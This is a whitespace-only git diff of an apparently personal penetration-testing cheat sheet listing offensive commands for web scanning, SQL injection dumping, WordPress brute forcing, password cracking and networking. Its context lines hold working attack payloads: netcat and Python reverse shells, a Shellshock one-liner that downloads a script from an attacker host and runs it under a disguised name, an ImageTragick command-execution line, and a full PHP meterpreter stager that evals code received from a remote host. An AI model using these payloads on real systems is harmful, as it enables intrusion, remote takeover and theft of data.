@@ -10,7 +10,7 @@ by `-LBr`
 # web
 
 #### nikto
-- VulnScan specific page or sub page  
+- VulnScan specific page or sub page
 `> nikto -h 'url'`
 
 #### curl
@@ -26,22 +26,22 @@ by `-LBr`
 - upload data through PUT option
 `> curl -v -X PUT -d '@path/to/file.txt' 'url/file.txt'`
 
-- local file inclusion using in 'url' / path traversal 
+- local file inclusion using in 'url' / path traversal
 `> curl 'url'/?page=php://filter/convert.base64-encode/resource=config`
 
 #### dirb
-- Scanning for web directories  
+- Scanning for web directories
 `> dirb 'url' -w 'wordlist`
 
 #### wfuzz
-- Fuzzing specific website using a directory wordlist 
+- Fuzzing specific website using a directory wordlist
 `> wfuzz -c -z file,/path/to/wordlist.txt --hc 404,301,200 'url/FUZZ'`
 
 #### sqlmap
 - Scan url without knowing the exact db backend at higher level and risk
 `> sqlmap -u 'url' --cookie='string' --risk 3--level 3 --dbs`
 
-- Dump tables of mysql db 
+- Dump tables of mysql db
 `> sqlmap --url target_address --cookie 'sting' --dbms mysql --tables --dump`
 
 - Dump specific DB
@@ -76,7 +76,7 @@ by `-LBr`
 - Brute force wp login using a wordlist
 `> wpscan --url 'url' --wordlist 'list.txt' --username 'name'`
 
-- enumerate all plugins, all themes, usernames 
+- enumerate all plugins, all themes, usernames
 `> wpscan --url 'url' --enumerate ap --enumerate at --enumerate u`
 
 - enumerate all plugins
@@ -96,11 +96,11 @@ by `-LBr`
 # wordlists & passwords
 
 #### CeWL
-- Generate wordlist with spidering 3 levels of the url  
+- Generate wordlist with spidering 3 levels of the url
 `> cewl -d 3 -e 'url' > /path/to/out.txt`
 
 #### cut
-- Cut the first 10 characters  
+- Cut the first 10 characters
 `> cut -c10- '/path/to/list.tx' > '/path/to/out.txt'`
 
 - cut and select a specific field using delimiter " " (blank space) very useful when piping an output like nmap
@@ -118,10 +118,10 @@ by `-LBr`
 `> crunch 2 6 'string' > 'file.txt'`
 
 #### john
-- Mix words in wordlist to genreate better dict file 
+- Mix words in wordlist to genreate better dict file
 `> john --wordlist="/path/to/wordlist/ --rules --stdout > /path/to/newwordlist`
 
-- Crack shadow file with usernames and hashed pws 
+- Crack shadow file with usernames and hashed pws
 `> john '/path/to/shadowfile.bak'`
 
 #### fcrackzip
@@ -180,10 +180,10 @@ by `-LBr`
 `> cat 'file' | base64 --decode > 'file_decoded'`
 
 #### steghide
-- Show information inside picture 
+- Show information inside picture
 `> steghide --info '/path/to/file'`
 
-- Extract file from picture  
+- Extract file from picture
 `> steghide --extract -sf 'path/to/stegofile'`
 
 - embed 'file' in image
@@ -195,13 +195,13 @@ by `-LBr`
 # networking
 
 #### nmap
-- Service scan testing all tcp ports  
+- Service scan testing all tcp ports
 `> nmap -p- -A -T4 'ip'`
 
-- Specific port knocking  
+- Specific port knocking
 `> nmap -r -Pn -p1,2,... 'ip'`
 
-- Scan udp ports  
+- Scan udp ports
 `> nmap -p- -sU 'ip'`
 
 - brute force webform with NSE - nmap scripting engine
@@ -213,13 +213,13 @@ https://nmap.org/nsedoc/scripts/http-form-brute.html
 `> netdiscover -r 'ip/range' -L`
 
 #### netcat
-- Connect to 'port'  
+- Connect to 'port'
 `> nc 'ip' 'port'`
 
-- Connect to a UDP 'port'  
+- Connect to a UDP 'port'
 `> nc -nvu 'ip' 'port'`
 
-- Listen on 'port'  
+- Listen on 'port'
 `> nc -lvnp 'port'`
 
 - send specific string after connecting
@@ -228,16 +228,16 @@ https://nmap.org/nsedoc/scripts/http-form-brute.html
 - execute /bin/bash after established connection (simple reverse shell)
 `> nc -lvp <port> -e /bin/bash`
 
-- netcat with -e option (may not be available depending on nc version)  
+- netcat with -e option (may not be available depending on nc version)
 `> nc -e /bin/sh <ip> <port>`
 
-- alternative way to get a reverse shell in case -e option is not available  
+- alternative way to get a reverse shell in case -e option is not available
 `> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f`
 
-- filetransfer: on the receiving end  
+- filetransfer: on the receiving end
 `> nc -l -p <port> > out.file`
 
-- filetransfer: on the sending end  
+- filetransfer: on the sending end
 `> nc -w3 <ip> <port> < file.tosend`
 
 #### netstat
@@ -328,7 +328,7 @@ The target post option (e.g. with Burp Repeater or curl):
 	include() - reads a file and interprets content as PHP code
 	eval() - interpret string as PHP code
 	pregreplace() - if it uses the /e modifier it interprets the replacement string as PHP code
-	
+
 	Command Execution:
 	exec() - executes command + returns last line of its output
 	passthru() - executes command + returns its output to the remote browser
@@ -337,7 +337,7 @@ The target post option (e.g. with Burp Repeater or curl):
 	system() - executes command + returns its output (much the same as passthru())
 	.can't handle binary data
 	popen() - executes command + connects its output or input stream to a PHP file descriptor
-	
+
 	File Disclosure:
 	fopen() - opens a file and associates it with a PHP file descriptor
 	readfile() - reads a file and writes its contents directly to the remote browser
@@ -390,7 +390,7 @@ or
 - download remote shell script and clean up after 5 secs
 `() { :;}; /bin/bash -c \"/usr/bin/env curl -s http://<attacker ip>/<file>.py > /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update > /dev/null& sleep 5; rm -rf /tmp/clamd_update\"`
 
-#### convert ImageTragick arbitrary command execution 
+#### convert ImageTragick arbitrary command execution
 Using vulnerability in 'convert' to execute arbitrary commands with privelege:
 `> sudo convert 'https://";/bin/bash"' /dev/null`
 
@@ -441,28 +441,28 @@ or
 #### simple netcat reverse shell [sh]
 `> nc - lvp <port> -e /bin/bash`
 
--  alternative way to get a reverse shell in case -e option is not available 
+-  alternative way to get a reverse shell in case -e option is not available
 `> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f`
 
 #### reverse shell [py]
 	python -c 'import socket,subprocess,os;
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 	s.connect(("lhost",lport));
-	os.dup2(s.fileno(),0); 
-	os.dup2(s.fileno(),1); 
+	os.dup2(s.fileno(),0);
+	os.dup2(s.fileno(),1);
 	os.dup2(s.fileno(),2);
 	p=subprocess.call(["/bin/sh","-i"]);'
 
 #### reverse meterpreter shell [php]
-	<?php /**/ error_reporting(0); $ip = '10.1.1.1'; 
-	$port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); 
-	$s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); 
-	$s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); 
-	$res = @socket_connect($s, $ip, $port); 
-	if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); 
-	break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); 
-	$len = $a['len']; 
-	$b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); 
+	<?php /**/ error_reporting(0); $ip = '10.1.1.1';
+	$port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}");
+	$s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port);
+	$s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+	$res = @socket_connect($s, $ip, $port);
+	if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4);
+	break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len);
+	$len = $a['len'];
+	$b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b);
 	die();
 
 #### generic meterpreter php reverse shell code [msfvenom]
@@ -496,7 +496,7 @@ or
 
 #### Build msf search index [sh]
 	> service postgres start
-	> msfdb init 
+	> msfdb init
 	> msfdb start
 	> msf> db_rebuild_cache
 
@@ -529,8 +529,8 @@ or
 		then <...>
 		else <...>
 	fi
-	for x in `seq 1 254`; do 
-	<...$1.$x> 
+	for x in `seq 1 254`; do
+	<...$1.$x>
 	done
 #### change user password [py]
 	#! /usr/bin/env python
@@ -557,10 +557,10 @@ or
 
 #### guake tab script [py]
 	# #!/usr/bin/python
-	# Script to crate custom guake tabs 
+	# Script to crate custom guake tabs
 	# by LBr
 	import os
-	
+
 	# get current Tab number
 	scripttab = os.popen('guake -g').read()
 
@@ -574,7 +574,7 @@ or
 		os.system('guake -s' + scripttab)
 
 #### Install additional tools for Kali [sh]
-	> apt-get install steghide hexchat zbartools meld ftp openvpn iftop nload etherape dict-free exiftool exif irssi lynx openvas bettercap bridge-utils 
+	> apt-get install steghide hexchat zbartools meld ftp openvpn iftop nload etherape dict-free exiftool exif irssi lynx openvas bettercap bridge-utils
 
 #### startup guake with useful tabs [sh]
 	guake -n k -r "netdiscover"
